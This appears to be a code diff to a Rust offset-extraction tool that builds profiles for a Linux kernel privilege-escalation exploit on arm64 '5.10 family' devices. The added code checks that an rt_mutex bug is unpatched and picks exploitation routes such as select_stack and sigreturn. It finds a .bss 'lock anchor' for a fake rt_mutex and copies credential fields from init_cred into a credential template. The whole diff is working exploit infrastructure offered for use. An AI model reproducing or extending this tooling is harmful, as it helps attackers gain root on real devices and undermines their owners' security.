@@ -14,6 +14,7 @@ use ghostlock_extract::derive::{
     ensure_rtmutex_43499_unpatched, multicast_waiter_off, relative_symbols,
 };
 use ghostlock_extract::error::{ExtractError, Result};
+use ghostlock_extract::family;
 use ghostlock_extract::fdt::{recover_kernel_phys_load, recover_kernel_phys_load_from_uefi};
 use ghostlock_extract::iomem;
 use ghostlock_extract::kallsyms;
@@ -61,8 +62,11 @@ struct Cli {
     #[arg(long, value_parser = ["text", "json", "conf"], default_value = "text")]
     format: String,
     /// route written to --format conf; defaults to the analysis suggestion
-    #[arg(long, value_parser = ["tcp_zerocopy", "select_stack", "multicast_waiter"])]
+    #[arg(long, value_parser = ["tcp_zerocopy", "select_stack", "multicast_waiter", "sigreturn"])]
     route: Option<String>,
+    /// derive the route's lock-anchor region and emit it in --format conf
+    #[arg(long)]
+    anchor: bool,
     /// treat every unresolved symbol as optional (emit 0)
     #[arg(long)]
     allow_missing: bool,
@@ -336,18 +340,16 @@ fn run(cli: &Cli) -> Result<i32> {
             kernel_phys_offset = Some(dram_base);
         }
         if kernel_phys_load.is_none() {
-            if let (Some(kc), Some(text), Some(stext)) = (
-                info.kernel_code_start,
-                kallsyms::unique(&symbols, "_text"),
-                kallsyms::unique(&symbols, "_stext"),
-            ) {
-                let delta = stext.wrapping_sub(text) & 0xffff_ffff;
-                let derived = kc.wrapping_sub(delta) & 0xffff_ffff;
+            /* arch/arm64/kernel/setup.c: kernel_code.start = __pa_symbol(_text),
+             * so the "Kernel code" range already starts at the image's physical
+             * base. Subtracting (_stext - _text) here made every 5.10 value
+             * 0x10000 low (the reason `--phys` was needed as a workaround). */
+            if let Some(kc) = info.kernel_code_start {
                 eprintln!(
-                    "info: iomem; kernel_phys_load=0x{derived:x} kernel_phys_offset=0x{:x}",
+                    "info: iomem; kernel_phys_load=0x{kc:x} kernel_phys_offset=0x{:x}",
                     kernel_phys_offset.unwrap_or(0)
                 );
-                kernel_phys_load = Some(derived);
+                kernel_phys_load = Some(kc);
                 phys_source = "iomem";
             }
         }
@@ -420,6 +422,9 @@ fn run(cli: &Cli) -> Result<i32> {
                  kernel_phys_load unset so the runtime derives it"
             );
         }
+    }
+    if cli.anchor && cli.format != "conf" {
+        eprintln!("warning: --anchor only affects --format conf; ignoring");
     }
     if cli.route.is_some() && cli.format != "conf" {
         eprintln!("warning: --route only affects --format conf; ignoring");
@@ -562,7 +567,20 @@ fn run(cli: &Cli) -> Result<i32> {
     if let Some(slot) = derived.get("off_slide_loggers_0_1").copied() {
         symbol_offsets.insert("off_slide_loggers_0_1".to_string(), Some(slot));
     }
-    let struct_offsets = resolve_structs(btf.as_ref());
+    let mut struct_offsets = resolve_structs(btf.as_ref());
+    // The template fills the profile contract, not the diagnostic report: the
+    // JSON/text formats keep showing what the image itself yielded.
+    if btf.is_none() && cli.format == "conf" {
+        if let Some(release) = release
+            .as_deref()
+            .filter(|release| family::matches(release))
+        {
+            family::apply_structs(&mut struct_offsets);
+            eprintln!(
+                "info: no BTF; task_struct filled from the diting 5.10 family template ({release})"
+            );
+        }
+    }
 
     let missing: Vec<String> = symbol_offsets
         .iter()
@@ -644,12 +662,28 @@ fn run(cli: &Cli) -> Result<i32> {
         let route = match cli.route.as_deref() {
             Some(route) => Some(route.to_string()),
             None => {
-                let paths =
-                    analysis::probe_paths(&symbols, &boot.kernel, &rel_symbols, &sorted_offsets);
-                let pselect_derived = derived.contains_key("pselect_waiter_shift_value");
-                let (suggested, _, _) =
-                    analysis::suggest_route(pselect_derived, &paths, release.as_deref());
-                suggested.map(str::to_string)
+                match family::route_hint(&boot.kernel, &rel_symbols, &sorted_offsets, release_text)
+                {
+                    // The diting 5.10 line has a physical discriminator:
+                    // do_futex's frame depth decides whether select_stack is in
+                    // band.
+                    Some((hint, reason)) => {
+                        eprintln!("info: {reason}");
+                        Some(hint.to_string())
+                    }
+                    None => {
+                        let paths = analysis::probe_paths(
+                            &symbols,
+                            &boot.kernel,
+                            &rel_symbols,
+                            &sorted_offsets,
+                        );
+                        let pselect_derived = derived.contains_key("pselect_waiter_shift_value");
+                        let (suggested, _, _) =
+                            analysis::suggest_route(pselect_derived, &paths, release.as_deref());
+                        suggested.map(str::to_string)
+                    }
+                }
             }
         };
         // select_stack is the only route that needs the derived pselect layout;
@@ -701,6 +735,43 @@ fn run(cli: &Cli) -> Result<i32> {
                 ),
             }
         }
+        // On-device derivation: the fake rt_mutex lives in a zeroed .bss
+        // region; the anchor triple is per image (offset, safe length, slot
+        // pitch). The pitch is the family's sizeof(rt_mutex): the anchor scan
+        // does not derive it (docs/analysis/anchor-derivation-plan.md).
+        if cli.anchor && family::matches(release_text) {
+            match route.as_deref() {
+                Some(route) if route == "select_stack" || route == "sigreturn" => {
+                    match anchor::best_candidate(
+                        &boot.kernel,
+                        &rel_symbols,
+                        Some("dump_skip.zeroes"),
+                    ) {
+                        Some(a) => {
+                            eprintln!(
+                                "info: lock anchor {} +0x{:x}, 0x{:x} bytes, stride {}, verdict {}",
+                                a.candidate.name,
+                                a.candidate.offset,
+                                a.safe_len,
+                                family::ANCHOR_STRIDE,
+                                a.verdict.label(),
+                            );
+                            geometry.push(("lock_anchor_image", a.candidate.offset as i64));
+                            geometry.push(("lock_anchor_bytes", a.safe_len as i64));
+                            geometry.push(("lock_anchor_stride", family::ANCHOR_STRIDE as i64));
+                        }
+                        None => eprintln!(
+                            "warning: --anchor found no usable .bss region; the profile falls \
+                             back to the reclaimed page"
+                        ),
+                    }
+                }
+                Some(route) => eprintln!(
+                    "warning: --anchor: route {route} does not use a lock anchor; nothing emitted"
+                ),
+                None => eprintln!("warning: --anchor: no route selected; nothing emitted"),
+            }
+        }
         match route.as_deref() {
             Some(route) if geometry.is_empty() => eprintln!(
                 "warning: no image-derived geometry for route {route}; writing an unverified \
@@ -738,6 +809,34 @@ fn run(cli: &Cli) -> Result<i32> {
             });
             match derived_cred {
                 Some(cred) => cred,
+                None if family::matches(release_text) => {
+                    let init_cred_off = symbol_offsets.get("off_init_cred").copied().flatten();
+                    match init_cred_off
+                        .and_then(|offset| family::cred_from_image(&boot.kernel, offset, base))
+                    {
+                        Some(cred) => {
+                            let mut entries = report::conf_cred_5x(&cred, family::CRED_COPY_SIZE);
+                            entries.push((
+                                "usage_offset".to_string(),
+                                family::CRED_USAGE_OFFSET.to_string(),
+                            ));
+                            entries.push(("ref3_offset".to_string(), "0".to_string()));
+                            entries.push(("ref3_image".to_string(), "0".to_string()));
+                            eprintln!(
+                                "info: no BTF; cred refs read from init_cred at the diting 5.10 \
+                                 family offsets"
+                            );
+                            entries
+                        }
+                        None => {
+                            eprintln!(
+                                "warning: credential template omitted; init_cred reference \
+                                 pointers are not canonical kernel VAs"
+                            );
+                            Vec::new()
+                        }
+                    }
+                }
                 None => {
                     eprintln!(
                         "warning: credential template omitted; the built-in profile must \
